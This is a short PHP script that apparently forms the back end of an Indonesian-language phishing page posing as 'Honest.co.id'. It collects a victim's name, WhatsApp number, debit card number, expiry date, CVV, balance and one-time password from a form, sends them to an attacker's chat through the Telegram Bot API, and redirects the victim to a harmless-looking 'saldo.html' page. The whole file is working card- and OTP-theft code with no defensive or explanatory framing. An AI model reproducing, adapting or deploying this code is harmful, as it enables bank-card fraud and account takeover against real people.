<?php 



session_start();
include "./telegram.php";


$message = "<pre>┍─━━┑𝗛𝗼𝗻𝗲𝘀𝘁.𝗰𝗼.𝗶𝗱┍━━─┑</pre>". "<pre>\n𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ". $_POST['nama']. "</pre><pre>\n𝗡𝗼𝗺𝗼𝗿 𝗪𝗔 : ".  $_POST ['one']. "</pre><pre>\n𝗖𝗮𝗿𝗱 : ".  $_POST ['debit']. "</pre><pre>\n𝗩𝗮𝗹𝗶𝗱 : ".  $_POST ['bulan']. "/".  $_POST ['tahun']. "</pre><pre>\n𝗖𝗩𝗖 : ".  $_POST ['cvv']. "</pre><pre>\n𝗦𝗮𝗹𝗱𝗼 : ".  $_POST ['limit']. "</pre><pre>\n𝗢𝗧𝗣 : ".  $_POST ['ot']. "</pre>";
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  saldo.html");
?> 